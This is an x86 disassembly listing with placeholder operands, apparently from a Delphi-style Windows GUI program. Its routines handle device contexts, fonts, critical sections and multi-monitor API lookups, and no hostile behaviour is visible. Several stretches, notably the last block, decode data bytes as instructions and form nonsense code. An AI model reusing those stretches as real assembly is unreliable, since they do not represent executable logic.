jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429c55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429b14
cmp eax [ rw-data ]
jne r-xdata
call sub_4240b0
mov eax esi
call sub_429b14
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425148
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c30
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c040
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_429c7c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429d0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41bddc
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41c008
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c008
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_429d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4240b0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429d0f
mov eax [ ebp - 0x4 ]
call sub_40321c
call sub_4039d0
call sub_403a24
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429d34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429d74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_427648
mov eax [ ebx + 0x28 ]
call sub_42764c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429df4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429bc8
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41c040
pop esi
pop ebx
retn
sub_429e44
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_424704
mov [ rw-data ] eax
pop ebx
retn
sub_429e7c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429ec0
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_429e7c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_429f8c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_429fc4
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_42a1bc
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42a008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429ff0
xor eax eax
push ebp
push sub_42a0a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a0b0
mov eax [ ebp - 0x4 ]
call sub_429ffc
retn
mov eax 0x10
call sub_40278c
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42a0bc
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42a0bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4280f0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42a19b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4286b8
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_4237a0
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_423684
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_418d68
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_423a28
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_423d84
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_428374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a1bc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429ff0
xor eax eax
push ebp
push sub_42a207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a20e
mov eax [ ebp - 0x4 ]
call sub_429ffc
retn
mov esp ebp
pop ebp
retn
sub_42a20e
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_40321c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429ff0
xor eax eax
push ebp
push sub_42a207
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a20e
mov eax [ ebp - 0x4 ]
call sub_429ffc
retn
mov esp ebp
pop ebp
retn
sub_42a234
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_4229f8
push eax
mov eax ebx
call sub_4229f8
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42a008
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42a26c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a335
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a33c
retn
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
call sub_42732c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404a20
sub_42a340
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429e44
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429ec0
mov cx 0x2c
mov dl 0x1
mov eax [ sub_42213c ]
call sub_4221b0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_42213c ]
call sub_4221b0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_42213c ]
call sub_4221b0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429f8c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a3b0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a3b0
mov [ rw-data ] eax
mov ecx sub_422a08
mov edx sub_422a18
mov eax [ r-xdata ]
call sub_419b64
mov ecx r-xdata
mov edx sub_422c20
mov eax [ r-xdata ]
call sub_419b64
sub_42a44c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a471
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a478
retn
sub_42a5b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42a60c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a3ac
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_40321c
sub_42a650
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_42a694
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_40321c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40320c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_42a6d8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41a08c
mov eax esi
pop esi
pop ebx
retn
sub_42a704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a729
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a730
retn
sub_42a744
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42a7a4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42a744
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42a894
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a8b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8c0
retn
sub_42a8cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40441c
xor eax eax
push ebp
push sub_42a98b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a992
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40442c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a8cc
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f6c
sub_42a9b4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42a8cc
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42aa3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42a8cc
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42aacc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42a8cc
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42aa3c
sub_42ab62
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42a8cc
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42abe3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42acd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ada4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42a8cc
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ae78
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42a8cc
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42b013
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b039
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b040
retn
sub_42b054
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b079
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b080
retn
sub_42b0f8
cld
mov al 0x42
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
jo r-xdata
mov al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] dh
inc edx
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x117c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
lodsd [ esi ]
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xb0f87265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
js r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax + 0x72 ] bh
jae r-xdata
mov cl 0x42
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ ecx ] al
xchg bx ax
cld
mov cl 0x42
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
mov eax eax
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
mov al 0x42
int3
push esi
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42b1b4c0 ]
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
mov dl 0x42
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
outsb
je r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
mov cl 0x42
add bh bh
push [ ecx + esi * 4 + 0x42 ]
adc ecx [ ecx + 0x45 ]
insd
jl r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
